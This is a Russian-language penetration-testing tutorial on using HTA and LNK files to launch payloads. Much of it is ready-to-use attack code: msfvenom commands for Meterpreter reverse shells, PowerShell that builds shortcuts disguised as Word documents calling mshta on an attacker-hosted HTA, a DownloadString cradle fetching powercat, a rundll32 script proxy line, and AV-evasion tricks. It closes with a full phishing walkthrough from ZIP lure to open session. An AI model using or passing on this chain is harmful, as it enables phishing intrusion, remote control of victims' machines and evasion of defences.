# HTA и LNK как контейнеры запуска полезной нагрузки в тестах на проникновение

## 1. Механизмы доставки начального доступа: HTA и LNK как векторы запуска

HTA (HTML Application) и LNK (Shell Link, файлы ярлыков) — два принципиально разных по природе формата, объединённых одной ролью в цепочке атаки: они выступают **контейнерами**, доставляющими и запускающими вредоносный код на целевой системе. Оба активно применяются на этапе *получения начального доступа* в тестах на проникновение и операциях Red Team, когда требуется обойти фильтры почтовых шлюзов, отключение макросов и ограничения выполнения скриптов, внушив пользователю иллюзию легитимного действия.

HTA — это файл с расширением `.hta`, содержащий HTML-разметку и скрипты (обычно VBScript или JScript), который исполняется процессом `mshta.exe` вне песочницы браузера, с правами запускающего пользователя и доступом к объектам ActiveX. LNK — это бинарный файл ярлыка Windows (Shell Link), указывающий на целевой объект и способный нести команды запуска, аргументы и даже внедрённые скрипты через поле командной строки или COM-объекты. Оба позволяют злоумышленнику стимулировать выполнение кода без прямого запуска скриптового файла с потенциально заблокированным расширением (`.vbs`, `.ps1`), маскируя атаку под привычную для пользователя операцию.

Сравнительная таблица ниже фиксирует ключевые различия, определяющие выбор контейнера в конкретной атакующей цепочке.

| Характеристика            | HTA (HTML Application)                                                                                         | LNK (Shell Link)                                                                                              |
|---------------------------|----------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| Формат                    | Текстовый файл в кодировке UTF-8/ANSI с разметкой HTML и встроенными скриптами                                  | Бинарный файл, соответствующий спецификации [MS-SHLLINK]                                                       |
| Расширение                | `.hta`                                                                                                         | `.lnk` (обычно скрыто Проводником)                                                                             |
| Интерпретатор             | `mshta.exe` (Windows Script Host в режиме HTML Application)                                                    | Проводник Windows (`explorer.exe`) или ОС при разрешении ссылок                                                |
| Модель исполнения         | Запускает HTML и скрипты в контексте текущего пользователя с возможностью использования ActiveX-объектов, доступом к файловой системе, реестру, WMI | Разрешается операционной системой путём вызова целевого приложения с заданными аргументами; исполняется сам целевой процесс, например `mshta` |
| Типичная доставка         | Вложения электронной почты (часто с двойным расширением или внутри архива), сценарии фишинга, хостинг на веб-сервере и запуск через URL | USB-накопители, фишинговые ZIP-архивы с поддельным иконкой, сетевые папки                                        |
| Основное преимущество     | Может выполнять сложную логику на VBScript/JScript, динамически загружать библиотеки и PowerShell, обходя AMSI и ограничения на запуск `.ps1` напрямую | Выглядит как безобидный значок документа/папки; пользовательские аргументы командной строки передаются прозрачно, не требуя открытия консоли |
| Сложность обнаружения     | Выше при грамотной обфускации и использовании легитимных COM-объектов; сигнатурный анализ AV часто нацелен на шаблоны HTA | Средняя; детектирование часто основано на эвристике или анализе командной строки в поле аргументов; легко маскируется под обычный ярлык |

Оба контейнера хорошо известны защитным решениям, поэтому в реальных тестах используются многоступенчатые техники обфускации, шифрования полезной нагрузки и «LOLBin»-подход (Living Off the Land Binaries). Важно понимать, что HTA и LNK не являются конкурентами, а скорее дополняют друг друга: типичная цепочка включает фишинговое вложение LNK, которое запускает `mshta.exe` с удалённым URL, хостящим HTA-файл, а тот, в свою очередь, выполняет PowerShell-загрузчик для установки агента C2.

Для иллюстрации контейнерной природы приведём минимальный пример HTA и команду создания LNK, нацеленного на его исполнение.

**HTA-файл** — простейшая оболочка с VBScript, демонстрирующая возможности вне песочницы (открытие диалога — на практике заменяется вызовом процессов или загрузкой кода):

```html
<html>
<head>
<HTA:APPLICATION ID="demo" WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
<script language="VBScript">
  Sub Window_OnLoad
    Set shell = CreateObject("WScript.Shell")
    shell.Popup "Payload executed via HTA", 3, "Test", 64
    ' Вредоносный код: shell.Run "powershell ..." и т.д.
    window.Close
  End Sub
</script>
</head>
<body></body>
</html>
```

**Создание LNK-файла через PowerShell**, целящегося в `mshta.exe` с аргументом-URL (HTA на подконтрольном сервере):

```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\Public\Documents\Invoice.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\mshta.exe"
$Shortcut.Arguments = 'http://<attacker_ip>/launcher.hta'
$Shortcut.IconLocation = "C:\Windows\System32\imageres.dll,65"  # иконка документа
$Shortcut.Save()
```

Эти два артефакта задают общую схему: HTA содержит исполняемый скрипт, а LNK — команду, активирующую интерпретатор с указанием на этот HTA. Далее в разделе 2 мы детально рассмотрим внутреннее устройство каждого из контейнеров.

## 2. Внутреннее устройство HTA и структура Shell Link (LNK)

Понимание форматов на уровне байтов и тегов необходимо для создания кастомных загрузчиков, обхода статических сигнатур и тонкой настройки payload-генераторов. Раздел построен по принципу: сначала разбор HTA-контейнера, затем бинарной структуры LNK.

### 2.1 Структура HTA-файла

HTML Application объединяет HTML, скриптовые языки Windows Script Host (VBScript, JScript) и специальный объект `HTA:APPLICATION`. В отличие от обычной веб-страницы, HTA выполняется вне ограничений зоны безопасности Internet Explorer: у него есть полный доступ к COM-объектам, файловой системе, реестру, WMI и возможности запуска произвольных процессов — всё, что доступно вызывающему пользователю. Интерпретатором служит `mshta.exe`, который загружает и выполняет HTA как локальное автономное приложение.

Основные компоненты HTA-файла можно представить в виде иерархической схемы:

```text
[HTA-файл]
  ├─ <html> (контейнер)
  ├─ <head>
  │    ├─ <HTA:APPLICATION>   (определяет свойства окна / режима выполнения)
  │    └─ <script>            (VBScript или JScript, часто обработчики событий)
  ├─ <body>                   (может содержать элементы интерфейса, но часто пуст или скрыт)
  └─ Комментарии / трюки с кодировкой (UTF-16LE для обхода эвристики)
```

Ключевой элемент — тег `<HTA:APPLICATION>`. Его атрибуты управляют поведением приложения: можно скрыть окно (`WINDOWSTATE="minimize"`, `SHOWINTASKBAR="no"`), подавить диалоги безопасности, установить иконку и заголовок. Наиболее важные для скрытности атрибуты:

| Атрибут            | Назначение                                                      | Типичное значение в пентесте            |
|--------------------|-----------------------------------------------------------------|-----------------------------------------|
| `WINDOWSTATE`      | Состояние окна при запуске                                      | `"minimize"` или `"normal"`             |
| `SHOWINTASKBAR`    | Показывать ли в панели задач                                    | `no` (скрыть)                           |
| `APPLICATIONNAME`  | Имя приложения (отображается в заголовке окна и диспетчере задач) | Произвольное, часто маскировочное       |
| `BORDER`           | Стиль границы окна                                              | `none` или `thin`                       |
| `INNERBORDER`      | Внутренняя граница                                              | `no`                                    |
| `SELECTION`        | Разрешить выделение текста                                      | `no`                                    |
| `SYSMENU`          | Системное меню окна                                             | `no`                                    |
| `CONTEXTMENU`      | Контекстное меню                                                | `no`                                    |

Скрипты, как правило, размещаются в блоке `<script language="VBScript">` (или `"JScript"`) и привязываются к событию `Window_OnLoad`, которое срабатывает после загрузки окна. Это стандартная точка входа для вредоносного кода.

Ниже представлен расширенный HTA-файл с внедрённой PowerShell-командой, закодированной в base64, — типичная оболочка, генерируемая инструментами вроде Empire или Cobalt Strike (артефакт для анализа статическими средствами):

```html
<html>
<head>
<HTA:APPLICATION ID="loader" WINDOWSTATE="minimize" SHOWINTASKBAR="no" BORDER="none" INNERBORDER="no" CONTEXTMENU="no"/>
<script language="VBScript">
  Sub Window_OnLoad
    Dim shell, cmd
    Set shell = CreateObject("WScript.Shell")
    ' Полезная нагрузка: PowerShell-загрузчик с обфускацией
    cmd = "pOwERShElL -nOp -w hIdden -enC <BASE64_ENCODED_PAYLOAD>"
    shell.Run cmd, 0, False
    window.Close
  End Sub
</script>
</head>
<body></body>
</html>
```

Для атакующего поле `<BASE64_ENCODED_PAYLOAD>` заменяется на соответствующий код, полученный, например, через `msfvenom -f hta-psh`. HTA-контейнер здесь выступает «пусковой установкой» для более мощного скриптового движка PowerShell, обходя прямое выполнение `.ps1`, которое могло бы быть заблокировано политиками выполнения.

### 2.2 Бинарная структура LNK-файла

Формат Shell Link Binary File Format ([MS-SHLLINK]) определяет жёсткую структуру, начинающуюся с обязательного заголовка SHELL_LINK_HEADER (76 байт), за которым следуют опциональные блоки, описывающие целевой объект, аргументы, иконку, горячие клавиши и пр. Нас в контексте доставки полезной нагрузки интересуют поля, отвечающие за путь к исполняемому файлу и аргументы командной строки.

Упрощённая схема компоновки LNK-файла:

```text
+-------------------+
| SHELL_LINK_HEADER | - размер 76 байт, магическая сигнатура 0x00021401, флаги структуры
+-------------------+
| LinkTargetIDList  | (если флаг HasLinkTargetIDList) - идентификатор целевого объекта (PIDL)
+-------------------+
| LinkInfo          | (если флаг HasLinkInfo) - информация о томе/сетевом пути
+-------------------+
| StringData        | (опционально) - DESCRIPTION, RELATIVE_PATH, WORKING_DIR, COMMAND_LINE_ARGUMENTS, ICON_LOCATION
+-------------------+
| ExtraData         | (опционально) - дополнительные блоки, например ConsoleData, KnownFolderData
+-------------------+
```

Для выполнения произвольных команд наиболее значимы два компонента:
- **TargetPath** (не хранится отдельной строкой, а формируется из `LinkTargetIDList` и `LinkInfo`) — путь к выполняемому файлу, например, `C:\Windows\System32\mshta.exe`.
- **COMMAND_LINE_ARGUMENTS** (поле в секции `StringData`) — строка с аргументами, передаваемая целевому процессу. Именно сюда помещается URL HTA-файла, путь к скрипту или закодированная команда PowerShell.

Обязательный заголовок имеет следующую структуру (первые 76 байт). Приведём иллюстративный hex-дамп начала LNK-файла с разметкой полей (значения зависят от среды, но формат фиксирован):

```text
Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000  4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00   L...............
           ^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^
           |  Размер (76)  |  Сигнатура  |    LinkFlags
00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 
           | FileAttributes (+другие поля)
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
           ^^^^^^^^^^^^^^^
           | CreationTime
00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00000040  00 00 00 00 00 00 00 00 00 00 00 00               ............
```

Для атакующего, создающего LNK-файл вручную, важнее практический интерфейс: COM-объект `WScript.Shell` или прямое формирование бинарного файла по спецификации. В разделе 3 мы рассмотрим оба подхода и типовые приёмы встраивания полезной нагрузки.

## 3. Практическое применение в пентестах: генерация и развёртывание HTA/LNK-payload

В операциях по получению начального доступа HTA и LNK редко применяются изолированно. Чаще всего они встраиваются в многозвенную атаку, где LNK-файл служит триггером, а HTA — средством доставки более сложного загрузчика (PowerShell, VBScript, .NET сборка). Раздел фокусируется на практических техниках генерации, обхода средств защиты и типовых сценариях доставки.

### 3.1 Генерация HTA-payload

Наиболее распространённый способ — использование фреймворков, таких как Metasploit, Cobalt Strike или PowerShell Empire. Они автоматизируют создание HTA-файла с внедрённой оболочкой. Пример генерации HTA через `msfvenom` с внедрением PowerShell-загрузчика Meterpreter:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f hta-psh -o malicious.hta
```

Эта команда создаёт файл `malicious.hta`, внутри которого код VBScript запускает PowerShell со скрытым окном и выполняет base64-закодированную полезную нагрузку. При этом используется тот же шаблон, что был показан в разделе 2.1, но с реальными параметрами соединения.

Для более тонкой настройки и обхода AV часто применяют ручную обфускацию или утилиту `mshta` в пайплайне Cobalt Strike: генерация HTA-файла через Scripted Web Delivery (встроенный модуль), который размещает HTA на веб-сервере команды и выдаёт одноразовую команду запуска для жертвы.

Важно: HTA-файл может быть загружен не только как локальный файл, но и через URL — именно эта возможность эксплуатируется совместно с LNK. Команда `mshta http://<server>/payload.hta` загружает удалённый HTA и выполняет его, что минимизирует следы на диске и позволяет динамически обновлять нагрузку.

Пример содержимого сгенерированного файла (урезан для наглядности, блок base64 заменён комментарием):

```html
<html>
<head>
<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" BORDER="none" INNERBORDER="no" CONTEXTMENU="no"/>
<script language="VBScript">
Sub Window_OnLoad
  Dim shell, cmd
  Set shell = CreateObject("WScript.Shell")
  cmd = "powershell.exe -nop -w hidden -enc <BASE64>"
  shell.Run cmd, 0, False
  window.Close
End Sub
</script>
</head>
<body></body>
</html>
```

### 3.2 Создание и кастомизация LNK-файлов

В отличие от HTA, LNK-файлы не содержат скриптовых движков сами по себе, а лишь указывают ОС, какой процесс запустить и с какими параметрами. На практике распространены два способа создания вредоносных ярлыков:

1. **COM-объект WScript.Shell** — прост в автоматизации, доступен из PowerShell, VBScript, JScript, но оставляет множество артефактов в полях `TargetPath` и `Arguments`.
2. **Ручная сборка бинарного LNK** — с помощью утилит вроде `lnk-creator` на Python или собственных скриптов; позволяет тонко контролировать поля, перезаписывать иконку, подделывать размер целевого файла для обхода эвристики.

Пример создания LNK, запускающего `mshta` с удалённым HTA, через PowerShell с дополнительной маскировкой иконки под документ Word:

```powershell
$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut("$env:USERPROFILE\Desktop\Important_Report.doc.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\mshta.exe"
$Shortcut.Arguments = 'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc <BASE64>"",0:close")'
$Shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,1"
$Shortcut.WindowStyle = 7   # Minimized, not activated
$Shortcut.Save()
```

Обратите внимание: в поле `Arguments` может использоваться не прямой URL, а встроенный VBScript через псевдопротокол `vbscript:Execute`, что ещё больше сокращает количество подозрительных внешних соединений на ранних стадиях анализа. Техника `mshta vbscript:...` описана в MITRE ATT&CK как подвариант T1218.005 (Mshta).

Злоумышленники также часто эксплуатируют особенность Проводника: расширение `.lnk` по умолчанию не отображается, даже если опция «Скрывать расширения для зарегистрированных типов файлов» отключена. Это позволяет назвать файл `invoice.doc.lnk` и он будет выглядеть как `invoice.doc` с иконкой Word.

### 3.3 Тактики обхода контроля приложений и AV

И HTA, и LNK подвергаются пристальному анализу защитными средствами, поэтому практикующий пентестер обязан знать основные методы обхода:

- **Обфускация HTA-скриптов**: разбиение строк, использование вызовов через `eval`/`execute`, замена стандартных COM-объектов на редко анализируемые (например, `Shell.Application.ShellExecute` вместо `WScript.Shell.Run`). Шифрование полезной нагрузки и расшифровка через VBScript с последующим `ExecuteGlobal`.
- **Подмена родительского процесса**: запуск `mshta` через `rundll32` или `regsvr32`, что изменяет контекст и может сбить детектирование по дереву процессов. Пример: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<server>/payload.sct")`. Это выходит за рамки чистого HTA, но использует движок IE аналогичным образом.
- **Просачивание аргументов LNK**: вставка невидимых символов, разбиение строк, использование переменных окружения (`%COMSPEC%`) для маскировки `cmd.exe`. Также активно используется загрузка LNK с удалённых SMB-шар, что позволяет избежать локального файла и обходить контроль подписей.
- **Сокрытие сетевой активности**: LNK может запускать `mshta` с адресом, где HTA-файл подгружается по HTTPS и имитирует легитимный трафик к облачным сервисам.

Ниже — практический пример генерации LNK со встроенной командой PowerShell, обфусцированной через переменные окружения, и выводом в base64 для дальнейшего встраивания:

```powershell
# Генерация base64-команды PowerShell
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://<server>/powercat.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
# Создание ярлыка с использованием %COMSPEC% для запуска PowerShell через cmd
$Shortcut.TargetPath = "%COMSPEC%"
$Shortcut.Arguments = "/c powershell -enc $encodedCommand"
$Shortcut.Save()
```

Такая цепочка маскирует PowerShell под дочерний процесс `cmd.exe`, что может вписаться в легитимные административные сценарии.

## 4. Сквозной практический пример: фишинговая атака с комбинированным использованием LNK и HTA

**Исходные условия**: пентестер проводит имитацию целевой фишинговой атаки на сотрудников компании. Сервер управления C2 развёрнут на внешнем хостинге с IP-адресом `192.0.2.100` (иллюстративный). Используется Metasploit для ожидания обратных соединений. Задача — доставить полезную нагрузку, обойдя почтовый фильтр, который блокирует исполняемые файлы и скрипты, но разрешает ZIP-архивы с ярлыками.

**Шаг 1: Генерация HTA-файла с PowerShell-загрузчиком Meterpreter**  
Создаём файл `launcher.hta`, который при запуске через `mshta` загрузит и выполнит шелл-код. Используем `msfvenom` с форматом `hta-psh`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.100 LPORT=8443 -f hta-psh -o launcher.hta
```

Вывод команды содержит готовый HTA (структура идентична показанной в разделе 2.1, но с реальным base64-блоком). Артефакт: файл `launcher.hta` размещается на веб-сервере пентестера (Apache) по адресу `http://192.0.2.100/launcher.hta`.

**Шаг 2: Создание LNK-файла, запускающего mshta с URL**  
Готовим LNK, который при двойном клике выполнит `mshta.exe` и загрузит удалённый HTA. Иконка подменяется на иконку документа Word, имя файла — `Document_Recheck.lnk`.

```powershell
$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut("$env:TEMP\Document_Recheck.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\mshta.exe"
$Shortcut.Arguments = "http://192.0.2.100/launcher.hta"
$Shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,1"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
```

Проверяем корректность: при открытии LNK в песочнице (изолированной ВМ) видим вызов `mshta.exe` с аргументом и последующее выполнение PowerShell-импланта.

**Шаг 3: Доставка жертве**  
Файл `Document_Recheck.lnk` упаковывается в ZIP-архив (название `Tax_Receipt.zip`), чтобы обойти блокировку вложений с расширением `.lnk` на шлюзе. Архив отправляется по электронной почте с темой, мотивирующей открыть вложение (пример: «Срочно: проверьте налоговую квитанцию»). Пользователь, открыв архив и дважды кликнув по файлу с иконкой Word, запускает цепочку.

**Шаг 4: Обработка соединения на стороне C2**  
На сервере настроен обработчик Meterpreter:

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.100; set LPORT 8443; run"
```

При успешном выполнении всех звеньев на стороне атакующего появляется сессия Meterpreter:

```text
[*] Started reverse TCP handler on 192.0.2.100:8443
[*] Sending stage (200262 bytes) to <victim_ip>
[*] Meterpreter session 1 opened (192.0.2.100:8443 -> <victim_ip>:49173) at 2025-03-21 10:14:02 UTC
meterpreter > sysinfo
Computer        : DESKTOP-VICTIM
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
Domain          : WORKGROUP
...
```

**Шаг 5: Очистка следов**  
После демонстрации доступа пентестер может удалить локальный LNK из временного каталога, завершить процесс `mshta.exe` (дочерний к Meterpreter) и удалить HTA с веб-сервера, минимизируя артефакты.

**Ожидаемый вывод**: пример демонстрирует, как комбинация LNK-триггера и HTA-полезной нагрузки позволяет получить обратную shell-сессию в обход ограничений почтового шлюза и политик выполнения скриптов. Ключевой механикой является разделение на звенья: файл-ярлык не содержит вредоносного кода, но указывает на удалённый скриптовый контейнер, который в свою очередь загружает финальный имплант. Такой подход широко применяется в современных Red Team операциях.
